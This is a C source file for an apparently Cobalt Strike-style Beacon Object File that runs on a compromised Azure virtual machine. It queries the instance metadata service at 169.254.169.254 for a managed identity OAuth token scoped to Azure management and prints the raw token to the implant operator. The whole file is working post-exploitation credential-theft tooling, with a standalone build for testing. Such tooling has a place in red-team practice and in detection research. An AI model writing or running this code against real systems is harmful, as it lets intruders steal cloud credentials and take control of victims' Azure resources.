#include <windows.h>
#include <stdio.h>
#include <winhttp.h>

#ifdef BOF
#define DYNAMIC_LIB_COUNT
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#else
#define internal_printf printf
#define BeaconPrintf(x, y, ...) printf(y, ##__VA_ARGS__)
#define CALLBACK_ERROR 0
#define CALLBACK_OUTPUT 0
#endif

#ifdef BOF
// bof build stuff
#define WINHTTP$WinHttpOpen ((WINHTTPOPEN)DynamicLoad("WINHTTP", "WinHttpOpen"))
#define WINHTTP$WinHttpConnect ((WINHTTPCONNECT)DynamicLoad("WINHTTP", "WinHttpConnect"))
#define WINHTTP$WinHttpOpenRequest ((WINHTTPOPENREQUEST)DynamicLoad("WINHTTP", "WinHttpOpenRequest"))
#define WINHTTP$WinHttpSendRequest ((WINHTTPSENDREQUEST)DynamicLoad("WINHTTP", "WinHttpSendRequest"))
#define WINHTTP$WinHttpReceiveResponse ((WINHTTPRECEIVERESPONSE)DynamicLoad("WINHTTP", "WinHttpReceiveResponse"))
#define WINHTTP$WinHttpCloseHandle ((WINHTTPCLOSEHANDLE)DynamicLoad("WINHTTP", "WinHttpCloseHandle"))
#define WINHTTP$WinHttpQueryHeaders ((WINHTTPQUERYHEADERS)DynamicLoad("WINHTTP", "WinHttpQueryHeaders"))
#define WINHTTP$WinHttpQueryDataAvailable ((WINHTTPQUERYDATAAVAILABLE)DynamicLoad("WINHTTP", "WinHttpQueryDataAvailable"))
#define WINHTTP$WinHttpReadData ((WINHTTPREADDATA)DynamicLoad("WINHTTP", "WinHttpReadData"))
#define WINHTTP$WinHttpAddRequestHeaders ((WINHTTPADDREQUESTHEADERS)DynamicLoad("WINHTTP", "WinHttpAddRequestHeaders"))

#else
// test build stuff
#define WINHTTP$WinHttpOpen WinHttpOpen
#define WINHTTP$WinHttpConnect WinHttpConnect
#define WINHTTP$WinHttpOpenRequest WinHttpOpenRequest
#define WINHTTP$WinHttpSendRequest WinHttpSendRequest
#define WINHTTP$WinHttpReceiveResponse WinHttpReceiveResponse
#define WINHTTP$WinHttpCloseHandle WinHttpCloseHandle
#define WINHTTP$WinHttpQueryHeaders WinHttpQueryHeaders
#define WINHTTP$WinHttpQueryDataAvailable WinHttpQueryDataAvailable
#define WINHTTP$WinHttpReadData WinHttpReadData
#define WINHTTP$WinHttpAddRequestHeaders WinHttpAddRequestHeaders

void* intAlloc(size_t size) { return malloc(size); }
void intFree(void* addr) { free(addr); }

#endif

BOOL GetManagedIdentityToken(void) {
    BOOL success = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    DWORD dwStatusCode = 0;
    DWORD dwSize = sizeof(dwStatusCode);
    
    hSession = WINHTTP$WinHttpOpen(
        L"Azure IMDS Client",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpOpen failed\n");
        goto cleanup;
    }

    // IMDS endpoint is on port 80
    hConnect = WINHTTP$WinHttpConnect(hSession, L"169.254.169.254", 
        INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpConnect failed\n");
        goto cleanup;
    }

    hRequest = WINHTTP$WinHttpOpenRequest(hConnect, L"GET",
        L"/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);
    
    if (!hRequest) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpOpenRequest failed\n");
        goto cleanup;
    }

    if (!WINHTTP$WinHttpAddRequestHeaders(hRequest, 
        L"Metadata: true",
        -1L,
        WINHTTP_ADDREQ_FLAG_ADD)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add Metadata header\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Sending request to IMDS endpoint\n");
    if (!WINHTTP$WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpSendRequest failed\n");
        goto cleanup;
    }

    if (!WINHTTP$WinHttpReceiveResponse(hRequest, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpReceiveResponse failed\n");
        goto cleanup;
    }

    if (!WINHTTP$WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        NULL,
        &dwStatusCode,
        &dwSize,
        NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get status code\n");
        goto cleanup;
    }

    if (dwStatusCode != 200) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Request failed with status code: %lu\n", dwStatusCode);
        goto cleanup;
    }

    char* responseBuffer = NULL;
    DWORD totalRead = 0;

    for (;;) {
        DWORD dwAvailable = 0;
        if (!WINHTTP$WinHttpQueryDataAvailable(hRequest, &dwAvailable)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpQueryDataAvailable failed\n");
            break;
        }

        if (dwAvailable == 0) break;

        char* newBuffer = (char*)intAlloc(totalRead + dwAvailable + 1);
        if (!newBuffer) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
            break;
        }

        if (responseBuffer) {
            memcpy(newBuffer, responseBuffer, totalRead);
            intFree(responseBuffer);
        }
        responseBuffer = newBuffer;

        DWORD dwRead = 0;
        if (!WINHTTP$WinHttpReadData(hRequest, responseBuffer + totalRead, dwAvailable, &dwRead)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpReadData failed\n");
            break;
        }

        totalRead += dwRead;
        responseBuffer[totalRead] = '\0';
    }

    if (responseBuffer) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] IMDS Response:\n%s\n", responseBuffer);
        intFree(responseBuffer);
    }

    success = TRUE;

cleanup:
    if (hRequest) WINHTTP$WinHttpCloseHandle(hRequest);
    if (hConnect) WINHTTP$WinHttpCloseHandle(hConnect);
    if (hSession) WINHTTP$WinHttpCloseHandle(hSession);
    return success;
}

#ifdef BOF
VOID go(char* args, int len) {
    if(!bofstart()) {
        return;
    }

    GetManagedIdentityToken();

    printoutput(TRUE);
}
#else
INT main(int argc, char* argv[]) {
    GetManagedIdentityToken();
    return 0;
}
#endif